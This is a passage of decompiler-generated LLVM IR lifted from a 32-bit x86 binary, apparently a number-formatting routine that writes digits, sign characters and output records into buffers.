  br label %dec_label_pc_8064c3f

dec_label_pc_8064c3f:                             ; preds = %dec_label_pc_8064c20, %dec_label_pc_8064c2b, %dec_label_pc_8064c3f.backedge
  %v2_8064c42 = phi i32 [ %v2_8064c42.pre, %dec_label_pc_8064c3f.backedge ], [ 0, %dec_label_pc_8064c20 ], [ %v2_8064c39, %dec_label_pc_8064c2b ]
  %v0_8064c3f = phi i32 [ %v0_8064c3f.pre, %dec_label_pc_8064c3f.backedge ], [ %v2_8064c22, %dec_label_pc_8064c20 ], [ %v1_8064c32, %dec_label_pc_8064c2b ]
  %v1_8064c3f = add i32 %v0_8064c3f, -1
  %v8_8064c3f = icmp eq i32 %v1_8064c3f, 0
  store i1 %v8_8064c3f, i1* %zf.global-to-local, align 1
  store i32 %v1_8064c3f, i32* %ecx.global-to-local, align 4
  %v1_8064c40 = inttoptr i32 %v1_8064c3f to i8*
  %v2_8064c40 = load i8, i8* %v1_8064c40, align 1
  %v4_8064c40 = load i32, i32* %edx.global-to-local, align 4
  %v3_8064c42 = trunc i32 %v2_8064c42 to i8
  %v4_8064c42 = add i8 %v2_8064c40, %v3_8064c42
  %v19_8064c42 = zext i8 %v4_8064c42 to i32
  %v21_8064c42 = and i32 %v4_8064c40, -256
  %v22_8064c42 = or i32 %v21_8064c42, %v19_8064c42
  store i32 %v22_8064c42, i32* %edx.global-to-local, align 4
  %v7_8064c44 = icmp eq i8 %v4_8064c42, 48
  store i1 %v7_8064c44, i1* %zf.global-to-local, align 1
  store i8 %v4_8064c42, i8* %v1_8064c40, align 1
  %v0_8064c49 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8064c49, label %dec_label_pc_8064c3f.backedge, label %dec_label_pc_8064c4b

dec_label_pc_8064c3f.backedge:                    ; preds = %dec_label_pc_8064c3f, %dec_label_pc_8064c4b
  %v0_8064c3f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8064c42.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064c3f

dec_label_pc_8064c4b:                             ; preds = %dec_label_pc_8064c3f
  %v0_8064c4b = load i32, i32* %edx.global-to-local, align 4
  %v1_8064c4b = trunc i32 %v0_8064c4b to i8
  %v10_8064c4b = icmp eq i8 %v1_8064c4b, 57
  store i1 %v10_8064c4b, i1* %zf.global-to-local, align 1
  %tmp181 = icmp ult i8 %v1_8064c4b, 58
  br i1 %tmp181, label %dec_label_pc_8064c50, label %dec_label_pc_8064c3f.backedge

dec_label_pc_8064c50:                             ; preds = %dec_label_pc_8064c4b
  %v2_8064c50 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8064c50, i32* %eax.global-to-local, align 4
  %v0_8064c57 = load i32, i32* %ecx.global-to-local, align 4
  %v12_8064c57 = icmp eq i32 %v0_8064c57, %v2_8064c50
  store i1 %v12_8064c57, i1* %zf.global-to-local, align 1
  %tmp182 = icmp ugt i32 %v0_8064c57, %v2_8064c50
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp182, label %dec_label_pc_8064c5b, label %dec_label_pc_8064c68

dec_label_pc_8064c5b:                             ; preds = %dec_label_pc_8064c50
  store i32 %v2_8064b3c, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8064c71

dec_label_pc_8064c68:                             ; preds = %dec_label_pc_8064c50
  store i32 %v2_8064c50, i32* %edi.global-to-local, align 4
  store i32 %v2_8064c50, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8064c71

dec_label_pc_8064c71:                             ; preds = %dec_label_pc_8064c5b, %dec_label_pc_8064c68
  %v0_8064c71 = phi i32 [ %v0_8064c57, %dec_label_pc_8064c5b ], [ %v2_8064c50, %dec_label_pc_8064c68 ]
  %v1_8064c71 = add i32 %v0_8064c71, 1
  store i32 %v1_8064c71, i32* %eax.global-to-local, align 4
  %v2_8064c78 = inttoptr i32 %v1_8064c71 to i8*
  store i8 0, i8* %v2_8064c78, align 1
  store i1 %v12_8064bc8, i1* %zf.global-to-local, align 1
  br i1 %v1_8064bcd, label %dec_label_pc_8064c9f, label %dec_label_pc_8064c83

dec_label_pc_8064c83:                             ; preds = %dec_label_pc_8064c71
  %v0_8064c83 = load i32, i32* %esi.global-to-local, align 4
  %v11_8064c83 = icmp eq i32 %v0_8064c83, -4
  store i1 %v11_8064c83, i1* %zf.global-to-local, align 1
  %v5_8064c86 = icmp slt i32 %v0_8064c83, -4
  br i1 %v5_8064c86, label %dec_label_pc_8064f21, label %dec_label_pc_8064c8c

dec_label_pc_8064c8c:                             ; preds = %dec_label_pc_8064c83
  %v1_8064c8c = load i32, i32* %ebx.global-to-local, align 4
  %v12_8064c8c = icmp eq i32 %v1_8064c8c, %v0_8064c83
  store i1 %v12_8064c8c, i1* %zf.global-to-local, align 1
  %v8_8064c8e = icmp slt i32 %v1_8064c8c, %v0_8064c83
  br i1 %v8_8064c8e, label %dec_label_pc_8064f21, label %dec_label_pc_8064c94

dec_label_pc_8064c94:                             ; preds = %dec_label_pc_8064c8c
  %v2_8064c96 = sub i32 %v1_8064c8c, %v0_8064c83
  %v12_8064c96 = icmp eq i32 %v2_8064c96, 0
  store i1 %v12_8064c96, i1* %zf.global-to-local, align 1
  store i32 %v2_8064c96, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8064cb0

dec_label_pc_8064c9f:                             ; preds = %dec_label_pc_8064c71
  %v4_8064c9f = zext i8 %stack_var_-207.1 to i32
  %v5_8064c9f = load i32, i32* %edx.global-to-local, align 4
  %v6_8064c9f = and i32 %v5_8064c9f, -256
  %v7_8064c9f = or i32 %v6_8064c9f, %v4_8064c9f
  store i32 %v7_8064c9f, i32* %edx.global-to-local, align 4
  %v10_8064ca3 = icmp eq i8 %stack_var_-207.1, 102
  store i1 %v10_8064ca3, i1* %zf.global-to-local, align 1
  %v1_8064caa = icmp eq i1 %v10_8064ca3, false
  br i1 %v1_8064caa, label %dec_label_pc_8064f21, label %dec_label_pc_8064c9f.dec_label_pc_8064cb0_crit_edge

dec_label_pc_8064c9f.dec_label_pc_8064cb0_crit_edge: ; preds = %dec_label_pc_8064c9f
  %v0_8064cb0.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8064cb0

dec_label_pc_8064cb0:                             ; preds = %dec_label_pc_8064c9f.dec_label_pc_8064cb0_crit_edge, %dec_label_pc_8064c94
  %v0_8064cb2 = phi i32 [ %v0_8064cb0.pre, %dec_label_pc_8064c9f.dec_label_pc_8064cb0_crit_edge ], [ %v0_8064c83, %dec_label_pc_8064c94 ]
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8064c9f.dec_label_pc_8064cb0_crit_edge ], [ 102, %dec_label_pc_8064c94 ]
  %v1_8064cb0 = icmp eq i32 %v0_8064cb2, 0
  store i1 %v1_8064cb0, i1* %zf.global-to-local, align 1
  %v2_8064cb0 = icmp slt i32 %v0_8064cb2, 0
  store i32 %v0_8064cb2, i32* %edx.global-to-local, align 4
  %v1_8064cb4 = icmp eq i1 %v2_8064cb0, false
  br i1 %v1_8064cb4, label %dec_label_pc_8064cba, label %dec_label_pc_8064cb6

dec_label_pc_8064cb6:                             ; preds = %dec_label_pc_8064cb0
  %v0_8064cb6 = load i32, i32* %edi.global-to-local, align 4
  %v1_8064cb6 = add i32 %v0_8064cb6, -1
  %v8_8064cb6 = icmp eq i32 %v1_8064cb6, 0
  store i1 %v8_8064cb6, i1* %zf.global-to-local, align 1
  store i32 %v1_8064cb6, i32* %edi.global-to-local, align 4
  %v1_8064cb7 = inttoptr i32 %v1_8064cb6 to i8*
  store i8 48, i8* %v1_8064cb7, align 1
  %v0_8064cde.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064cba

dec_label_pc_8064cba:                             ; preds = %dec_label_pc_8064cb0, %dec_label_pc_8064f21, %dec_label_pc_8064cb6
  %v4_8064d56 = phi i32 [ 0, %dec_label_pc_8064f21 ], [ %v0_8064cb2, %dec_label_pc_8064cb0 ], [ %v0_8064cde.pre, %dec_label_pc_8064cb6 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-197.2, %dec_label_pc_8064f21 ], [ %stack_var_-197.0, %dec_label_pc_8064cb0 ], [ %stack_var_-197.0, %dec_label_pc_8064cb6 ]
  %v2_8064cba = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8064cba, i32* %eax.global-to-local, align 4
  store i32 %v1_8064c71, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8064cd9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8064cd9 = inttoptr i32 %v0_8064cd9 to i8*
  %v2_8064cd9 = load i8, i8* %v1_8064cd9, align 1
  %v3_8064cd9 = zext i8 %v2_8064cd9 to i32
  %v5_8064cd9 = and i32 %v2_8064cba, -256
  %v6_8064cd9 = or i32 %v3_8064cd9, %v5_8064cd9
  store i32 %v6_8064cd9, i32* %eax.global-to-local, align 4
  %v1_8064cdb = add i32 %v0_8064cd9, 1
  store i32 %v1_8064cdb, i32* %edi.global-to-local, align 4
  %v2_8064cdc = sub i32 %v1_8064c71, %v1_8064cdb
  store i32 %v2_8064cdc, i32* @ecx, align 4
  %v1_8064cde = icmp eq i32 %v4_8064d56, 0
  store i1 %v1_8064cde, i1* %zf.global-to-local, align 1
  %v2_8064cde = icmp slt i32 %v4_8064d56, 0
  store i32 %v6_8064cd9, i32* %stack_var_-22, align 4
  br i1 %v2_8064cde, label %dec_label_pc_8064d4a, label %dec_label_pc_8064cf5

dec_label_pc_8064cf5:                             ; preds = %dec_label_pc_8064cba
  store i32 %v1_8064cdb, i32* %ebx.global-to-local, align 4
  %v2_8064cf9 = sub i32 %v4_8064d56, %v2_8064cdc
  %v8_8064cf9 = xor i32 %v2_8064cdc, %v4_8064d56
  %v9_8064cf9 = xor i32 %v2_8064cf9, %v4_8064d56
  %v10_8064cf9 = and i32 %v9_8064cf9, %v8_8064cf9
  %v11_8064cf9 = icmp slt i32 %v10_8064cf9, 0
  %v12_8064cf9 = icmp eq i32 %v2_8064cf9, 0
  store i1 %v12_8064cf9, i1* %zf.global-to-local, align 1
  %v13_8064cf9 = icmp slt i32 %v2_8064cf9, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8064d07 = icmp eq i1 %v13_8064cf9, %v11_8064cf9
  br i1 %v2_8064d07, label %dec_label_pc_8064d09, label %dec_label_pc_8064d43

dec_label_pc_8064d09:                             ; preds = %dec_label_pc_8064cf5
  store i32 %v2_8064cf9, i32* %eax.global-to-local, align 4
  store i1 %v12_8064cf9, i1* %zf.global-to-local, align 1
  %tmp172 = icmp slt i32 %v2_8064cf9, 1
  %tmp173 = icmp eq i1 %tmp172, false
  br i1 %tmp173, label %dec_label_pc_8064d1e, label %dec_label_pc_8064d3f

dec_label_pc_8064d1e:                             ; preds = %dec_label_pc_8064d09
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8064d3f

dec_label_pc_8064d3f:                             ; preds = %dec_label_pc_8064d09, %dec_label_pc_8064d1e
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_8064d1e ], [ %stack_var_-132, %dec_label_pc_8064d09 ]
  store i32 -1, i32* %edx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ecx, align 4
  br label %dec_label_pc_8064d61

dec_label_pc_8064d43:                             ; preds = %dec_label_pc_8064cf5
  store i1 %v1_8064cde, i1* %zf.global-to-local, align 1
  %v1_8064d45 = icmp eq i1 %v1_8064cde, false
  br i1 %v1_8064d45, label %dec_label_pc_8064d50, label %dec_label_pc_8064d47

dec_label_pc_8064d47:                             ; preds = %dec_label_pc_8064d43
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064d4a

dec_label_pc_8064d4a:                             ; preds = %dec_label_pc_8064cba, %dec_label_pc_8064d47
  %v0_8064d9a105 = phi i32 [ %v4_8064d56, %dec_label_pc_8064cba ], [ -1, %dec_label_pc_8064d47 ]
  %v2_8064d4a = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8064d4a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064d61

dec_label_pc_8064d50:                             ; preds = %dec_label_pc_8064d43
  %v2_8064d54 = sub i32 %v2_8064cdc, %v4_8064d56
  store i32 %v2_8064d54, i32* @ecx, align 4
  %v5_8064d56 = add i32 %v1_8064cdb, %v4_8064d56
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 -1, i32* %edx.global-to-local, align 4
  %v2_8064d5d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8064d5d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064d61

dec_label_pc_8064d61:                             ; preds = %dec_label_pc_8064d4a, %dec_label_pc_8064d3f, %dec_label_pc_8064d50
  %v0_8064d9a104 = phi i32 [ %v0_8064d9a105, %dec_label_pc_8064d4a ], [ -1, %dec_label_pc_8064d3f ], [ -1, %dec_label_pc_8064d50 ]
  %v0_8064d83 = phi i32 [ %v2_8064d4a, %dec_label_pc_8064d4a ], [ %storemerge28, %dec_label_pc_8064d3f ], [ %v2_8064d5d, %dec_label_pc_8064d50 ]
  %v0_8064d74 = phi i32 [ %v2_8064cdc, %dec_label_pc_8064d4a ], [ 0, %dec_label_pc_8064d3f ], [ %v2_8064d54, %dec_label_pc_8064d50 ]
  %stack_var_-232.0 = phi i32 [ %v1_8064cdb, %dec_label_pc_8064d4a ], [ %v1_8064cdb, %dec_label_pc_8064d3f ], [ %v5_8064d56, %dec_label_pc_8064d50 ]
  store i32 %tmp144, i32* %edi.global-to-local, align 4
  %v3_8064d68 = load i32, i32* %v2_80649e3, align 4
  %v1_8064d6b = and i32 %v3_8064d68, 16
  %v2_8064d6b = icmp eq i32 %v1_8064d6b, 0
  store i1 %v2_8064d6b, i1* %zf.global-to-local, align 1
  store i32 %v1_8064d6b, i32* %eax.global-to-local, align 4
  %v1_8064d72 = icmp eq i1 %v2_8064d6b, false
  br i1 %v1_8064d72, label %dec_label_pc_8064d83, label %dec_label_pc_8064d74

dec_label_pc_8064d74:                             ; preds = %dec_label_pc_8064d61
  %v1_8064d74 = icmp eq i32 %v0_8064d74, 0
  store i1 %v1_8064d74, i1* %zf.global-to-local, align 1
  %v1_8064d76 = icmp eq i1 %v1_8064d74, false
  br i1 %v1_8064d76, label %dec_label_pc_8064d83, label %dec_label_pc_8064d78

dec_label_pc_8064d78:                             ; preds = %dec_label_pc_8064d74
  store i1 %v12_8064bc8, i1* %zf.global-to-local, align 1
  br i1 %v12_8064bc8, label %dec_label_pc_8064d9a, label %dec_label_pc_8064d7f

dec_label_pc_8064d7f:                             ; preds = %dec_label_pc_8064d78
  %v0_8064d7f = load i32, i32* %ebp.global-to-local, align 4
  %v1_8064d7f = icmp eq i32 %v0_8064d7f, 0
  store i1 %v1_8064d7f, i1* %zf.global-to-local, align 1
  %tmp174 = icmp slt i32 %v0_8064d7f, 1
  br i1 %tmp174, label %dec_label_pc_8064d9a, label %dec_label_pc_8064d83

dec_label_pc_8064d83:                             ; preds = %dec_label_pc_8064d7f, %dec_label_pc_8064d74, %dec_label_pc_8064d61
  %v1_8064d83 = inttoptr i32 %v0_8064d83 to i32*
  store i32 112, i32* %v1_8064d83, align 4
  %v0_8064d89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064d89 = add i32 %v0_8064d89, 4
  %v2_8064d89 = inttoptr i32 %v1_8064d89 to i32*
  store i32 1, i32* %v2_8064d89, align 4
  %v0_8064d90 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064d90 = add i32 %v0_8064d90, 8
  %v2_8064d90 = inttoptr i32 %v1_8064d90 to i32*
  store i32 ptrtoint (i32* @global_var_80702d0.1686 to i32), i32* %v2_8064d90, align 4
  %v0_8064d97 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064d97 = add i32 %v0_8064d97, 12
  %v9_8064d97 = icmp eq i32 %v1_8064d97, 0
  store i1 %v9_8064d97, i1* %zf.global-to-local, align 1
  store i32 %v1_8064d97, i32* %ebx.global-to-local, align 4
  %v0_8064d9a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064d9a

dec_label_pc_8064d9a:                             ; preds = %dec_label_pc_8064d7f, %dec_label_pc_8064d78, %dec_label_pc_8064d83
  %v0_8064da1 = phi i32 [ %v0_8064d83, %dec_label_pc_8064d7f ], [ %v0_8064d83, %dec_label_pc_8064d78 ], [ %v1_8064d97, %dec_label_pc_8064d83 ]
  %v0_8064d9a = phi i32 [ %v0_8064d9a104, %dec_label_pc_8064d7f ], [ %v0_8064d9a104, %dec_label_pc_8064d78 ], [ %v0_8064d9a.pre, %dec_label_pc_8064d83 ]
  %v1_8064d9a = add i32 %v0_8064d9a, 1
  %v8_8064d9a = icmp eq i32 %v1_8064d9a, 0
  store i1 %v8_8064d9a, i1* %zf.global-to-local, align 1
  %v9_8064d9a = icmp slt i32 %v1_8064d9a, 0
  store i32 %v1_8064d9a, i32* %edx.global-to-local, align 4
  %v1_8064d9b = icmp eq i1 %v9_8064d9a, false
  br i1 %v1_8064d9b, label %dec_label_pc_8064db4, label %dec_label_pc_8064d9d

dec_label_pc_8064d9d:                             ; preds = %dec_label_pc_8064d9a
  %v1_8064d9f = sub i32 -1, %v0_8064d9a
  store i32 %v1_8064d9f, i32* %eax.global-to-local, align 4
  %v1_8064da1 = inttoptr i32 %v0_8064da1 to i32*
  store i32 176, i32* %v1_8064da1, align 4
  %v0_8064da7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064da7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064da7 = add i32 %v1_8064da7, 4
  %v3_8064da7 = inttoptr i32 %v2_8064da7 to i32*
  store i32 %v0_8064da7, i32* %v3_8064da7, align 4
  %v0_8064daa = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064daa = add i32 %v0_8064daa, 8
  %v2_8064daa = inttoptr i32 %v1_8064daa to i32*
  store i32 ptrtoint (i32* @global_var_80702c3.1685 to i32), i32* %v2_8064daa, align 4
  %v0_8064db1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064db1 = add i32 %v0_8064db1, 12
  %v9_8064db1 = icmp eq i32 %v1_8064db1, 0
  store i1 %v9_8064db1, i1* %zf.global-to-local, align 1
  store i32 %v1_8064db1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064db4

dec_label_pc_8064db4:                             ; preds = %dec_label_pc_8064d9a, %dec_label_pc_8064d9d
  %v0_8064dbc = phi i32 [ %v0_8064da1, %dec_label_pc_8064d9a ], [ %v1_8064db1, %dec_label_pc_8064d9d ]
  %v0_8064db4 = load i32, i32* @ecx, align 4
  %v1_8064db4 = icmp eq i32 %v0_8064db4, 0
  store i1 %v1_8064db4, i1* %zf.global-to-local, align 1
  br i1 %v1_8064db4, label %dec_label_pc_8064dcb, label %dec_label_pc_8064db8

dec_label_pc_8064db8:                             ; preds = %dec_label_pc_8064db4
  store i32 %stack_var_-232.0, i32* %edi.global-to-local, align 4
  %v1_8064dbc = inttoptr i32 %v0_8064dbc to i32*
  store i32 112, i32* %v1_8064dbc, align 4
  %v0_8064dc2 = load i32, i32* @ecx, align 4
  %v1_8064dc2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064dc2 = add i32 %v1_8064dc2, 4
  %v3_8064dc2 = inttoptr i32 %v2_8064dc2 to i32*
  store i32 %v0_8064dc2, i32* %v3_8064dc2, align 4
  %v0_8064dc5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8064dc5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064dc5 = add i32 %v1_8064dc5, 8
  %v3_8064dc5 = inttoptr i32 %v2_8064dc5 to i32*
  store i32 %v0_8064dc5, i32* %v3_8064dc5, align 4
  %v0_8064dc8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064dc8 = add i32 %v0_8064dc8, 12
  %v9_8064dc8 = icmp eq i32 %v1_8064dc8, 0
  store i1 %v9_8064dc8, i1* %zf.global-to-local, align 1
  store i32 %v1_8064dc8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064dcb

dec_label_pc_8064dcb:                             ; preds = %dec_label_pc_8064db4, %dec_label_pc_8064db8
  %v0_8064de3 = phi i32 [ %v0_8064dbc, %dec_label_pc_8064db4 ], [ %v1_8064dc8, %dec_label_pc_8064db8 ]
  store i1 %v12_8064bc8, i1* %zf.global-to-local, align 1
  br i1 %v1_8064bcd, label %dec_label_pc_8064dd9, label %dec_label_pc_8064dd2

dec_label_pc_8064dd2:                             ; preds = %dec_label_pc_8064dcb
  store i1 %v2_8064d6b, i1* %zf.global-to-local, align 1
  br i1 %v2_8064d6b, label %dec_label_pc_8064df6, label %dec_label_pc_8064dd9

dec_label_pc_8064dd9:                             ; preds = %dec_label_pc_8064dd2, %dec_label_pc_8064dcb
  %v0_8064dd9 = load i32, i32* @ecx, align 4
  %v1_8064ddb = load i32, i32* %edx.global-to-local, align 4
  %v2_8064ddb = sub i32 %v0_8064dd9, %v1_8064ddb
  store i32 %v2_8064ddb, i32* %eax.global-to-local, align 4
  %v1_8064ddd = load i32, i32* %ebp.global-to-local, align 4
  %v2_8064ddd = sub i32 %v2_8064ddb, %v1_8064ddd
  %v8_8064ddd = xor i32 %v1_8064ddd, %v2_8064ddb
  %v9_8064ddd = xor i32 %v2_8064ddd, %v2_8064ddb
  %v10_8064ddd = and i32 %v9_8064ddd, %v8_8064ddd
  %v11_8064ddd = icmp slt i32 %v10_8064ddd, 0
  %v12_8064ddd = icmp eq i32 %v2_8064ddd, 0
  store i1 %v12_8064ddd, i1* %zf.global-to-local, align 1
  %v13_8064ddd = icmp slt i32 %v2_8064ddd, 0
  %v2_8064ddf = icmp eq i1 %v13_8064ddd, %v11_8064ddd
  br i1 %v2_8064ddf, label %dec_label_pc_8064df6, label %dec_label_pc_8064de1

dec_label_pc_8064de1:                             ; preds = %dec_label_pc_8064dd9
  %v2_8064de1 = sub i32 %v1_8064ddd, %v2_8064ddb
  store i32 %v2_8064de1, i32* %ebp.global-to-local, align 4
  %v1_8064de3 = inttoptr i32 %v0_8064de3 to i32*
  store i32 176, i32* %v1_8064de3, align 4
  %v0_8064de9 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8064de9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064de9 = add i32 %v1_8064de9, 4
  %v3_8064de9 = inttoptr i32 %v2_8064de9 to i32*
  store i32 %v0_8064de9, i32* %v3_8064de9, align 4
  %v0_8064dec = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064dec = add i32 %v0_8064dec, 8
  %v2_8064dec = inttoptr i32 %v1_8064dec to i32*
  store i32 ptrtoint (i32* @global_var_80702c3.1685 to i32), i32* %v2_8064dec, align 4
  %v0_8064df3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064df3 = add i32 %v0_8064df3, 12
  %v9_8064df3 = icmp eq i32 %v1_8064df3, 0
  store i1 %v9_8064df3, i1* %zf.global-to-local, align 1
  store i32 %v1_8064df3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064df6

dec_label_pc_8064df6:                             ; preds = %dec_label_pc_8064dd9, %dec_label_pc_8064dd2, %dec_label_pc_8064de1
  %v1_8064e7e114 = phi i32 [ %v0_8064de3, %dec_label_pc_8064dd9 ], [ %v0_8064de3, %dec_label_pc_8064dd2 ], [ %v1_8064df3, %dec_label_pc_8064de1 ]
  %v12_8064df6 = icmp eq i8 %stack_var_-197.1, 102
  store i1 %v12_8064df6, i1* %zf.global-to-local, align 1
  br i1 %v12_8064df6, label %dec_label_pc_8064e71, label %dec_label_pc_8064dfd

dec_label_pc_8064dfd:                             ; preds = %dec_label_pc_8064df6
  %v5_8064dfd = load i32, i32* %eax.global-to-local, align 4
  %v6_8064dfd = and i32 %v5_8064dfd, -256
  %v7_8064dfd = or i32 %v6_8064dfd, %stack_var_-42.0
  store i32 %v7_8064dfd, i32* %eax.global-to-local, align 4
  %v0_8064e04 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064e04 = icmp eq i32 %v0_8064e04, 0
  store i1 %v1_8064e04, i1* %zf.global-to-local, align 1
  %v2_8064e04 = icmp slt i32 %v0_8064e04, 0
  %v1_8064e06 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_8064e04, label %dec_label_pc_8064e15, label %dec_label_pc_8064e1e

dec_label_pc_8064e15:                             ; preds = %dec_label_pc_8064dfd
  store i32 %v0_8064e04, i32* %edx.global-to-local, align 4
  %v1_8064e17 = sub i32 0, %v0_8064e04
  store i1 %v1_8064e04, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8064e1e

dec_label_pc_8064e1e:                             ; preds = %dec_label_pc_8064dfd, %dec_label_pc_8064e15
  %storemerge27 = phi i32 [ %v1_8064e17, %dec_label_pc_8064e15 ], [ %v0_8064e04, %dec_label_pc_8064dfd ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_8064e15 ], [ 43, %dec_label_pc_8064dfd ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8064e26 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8064e26, i32* %ecx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8064e32

dec_label_pc_8064e32:                             ; preds = %dec_label_pc_8064e32.backedge, %dec_label_pc_8064e1e
  %v0_8064e3d = phi i32 [ %v0_8064e3d.pre, %dec_label_pc_8064e32.backedge ], [ %v2_8064e26, %dec_label_pc_8064e1e ]
  %v0_8064e3a = phi i32 [ %v0_8064e3a.pre, %dec_label_pc_8064e32.backedge ], [ 2, %dec_label_pc_8064e1e ]
  %v0_8064e32 = phi i32 [ %v9_8064e3b, %dec_label_pc_8064e32.backedge ], [ %storemerge27, %dec_label_pc_8064e1e ]
  %v1_8064e39 = ashr i32 %v0_8064e32, 31
  %v1_8064e3a = add i32 %v0_8064e3a, 1
  store i32 %v1_8064e3a, i32* %esi.global-to-local, align 4
  %v2_8064e3b = zext i32 %v0_8064e32 to i64
  %v4_8064e3b = zext i32 %v1_8064e39 to i64
  %v5_8064e3b = mul nuw i64 %v4_8064e3b, 4294967296
  %v6_8064e3b = or i64 %v5_8064e3b, %v2_8064e3b
  %v8_8064e3b = sdiv i64 %v6_8064e3b, 10
  %v9_8064e3b = trunc i64 %v8_8064e3b to i32
  %v10_8064e3b = srem i64 %v6_8064e3b, 10
  %v1_8064e3d = add i32 %v0_8064e3d, -1
  store i32 %v1_8064e3d, i32* @ecx, align 4
  store i32 %v9_8064e3b, i32* %edi.global-to-local, align 4
  %v3_8064e40 = and i32 %v9_8064e3b, -256
  %v1_8064e42 = trunc i64 %v10_8064e3b to i8
  %v2_8064e42 = add i8 %v1_8064e42, 48
  %v12_8064e42 = zext i8 %v2_8064e42 to i32
  %v15_8064e42 = or i32 %v12_8064e42, %v3_8064e40
  store i32 %v15_8064e42, i32* %eax.global-to-local, align 4
  %v9_8064e44 = icmp eq i32 %v0_8064e3a, 2
  store i1 %v9_8064e44, i1* %zf.global-to-local, align 1
  %v3_8064e47 = inttoptr i32 %v1_8064e3d to i8*
  store i8 %v2_8064e42, i8* %v3_8064e47, align 1
  store i32 %v9_8064e3b, i32* %edx.global-to-local, align 4
  %v0_8064e4b = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8064e4b, label %dec_label_pc_8064e32.backedge, label %dec_label_pc_8064e4d

dec_label_pc_8064e32.backedge:                    ; preds = %dec_label_pc_8064e32, %dec_label_pc_8064e4d
  %v0_8064e3a.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8064e3d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8064e32

dec_label_pc_8064e4d:                             ; preds = %dec_label_pc_8064e32
  %v2_8064e4d = icmp eq i32 %v9_8064e3b, 0
  store i1 %v2_8064e4d, i1* %zf.global-to-local, align 1
  %v1_8064e4f = icmp eq i1 %v2_8064e4d, false
  br i1 %v1_8064e4f, label %dec_label_pc_8064e32.backedge, label %dec_label_pc_8064e51

dec_label_pc_8064e51:                             ; preds = %dec_label_pc_8064e4d
  %v4_8064e51 = zext i8 %storemerge9 to i32
  %v7_8064e51 = or i32 %v3_8064e40, %v4_8064e51
  store i32 %v7_8064e51, i32* %edx.global-to-local, align 4
  %v0_8064e55 = load i32, i32* @ecx, align 4
  %v1_8064e55 = add i32 %v0_8064e55, -2
  store i32 %v1_8064e55, i32* %eax.global-to-local, align 4
  %v3_8064e58 = add i32 %v0_8064e55, -1
  %v4_8064e58 = inttoptr i32 %v3_8064e58 to i8*
  store i8 %storemerge9, i8* %v4_8064e58, align 1
  %v5_8064e5b = load i32, i32* %edx.global-to-local, align 4
  %v6_8064e5b = and i32 %v5_8064e5b, -256
  %v7_8064e5b = or i32 %v6_8064e5b, %stack_var_-42.0
  store i32 %v7_8064e5b, i32* %edx.global-to-local, align 4
  %v2_8064e5f = load i32, i32* @ecx, align 4
  %v3_8064e5f = add i32 %v2_8064e5f, -2
  %v4_8064e5f = inttoptr i32 %v3_8064e5f to i8*
  store i8 %v1_8064e06, i8* %v4_8064e5f, align 1
  %v0_8064e62 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064e62 = inttoptr i32 %v0_8064e62 to i32*
  store i32 112, i32* %v1_8064e62, align 4
  %v0_8064e68 = load i32, i32* %esi.global-to-local, align 4
